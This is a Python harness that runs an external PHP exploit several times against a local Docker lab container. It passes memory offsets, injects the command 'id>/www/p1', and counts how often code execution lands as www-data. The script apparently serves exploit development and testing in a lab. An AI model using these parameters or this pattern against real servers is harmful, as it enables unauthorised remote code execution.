import os
import subprocess, sys, time
BASE = os.path.dirname(os.path.abspath(__file__))

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

port = "18120"
c = "p2s_fresh"
N = int(sys.argv[1]) if len(sys.argv) > 1 else 3
landed = 0
for i in range(1, N + 1):
    sh(f'docker exec {c} sh -c "rm -f /var/lib/php/sessions/* /www/p1 2>/dev/null"')
    cmd = ["python", BASE + r"\exploit.py",
           "-u", f"http://127.0.0.1:{port}/index.php",
           "--profile", "bookworm",
           "--zif-offset", "0x465370", "--dtor-offset", "0x65eb60",
           "--retries", "2",
           "-c", "id>/www/p1", "--fetch", "/p1"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=240)
        out = (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        out = "TIMEOUT"
    ok = "uid=33" in out
    if ok:
        landed += 1
    reached = "stage1"
    if "stage 2" in out: reached = "stage2"
    if "stage 3" in out: reached = "stage3"
    print(f"[{i}] {'PROOF' if ok else 'no'} (reached {reached})", flush=True)
print(f"\nLANDED {landed}/{N}")
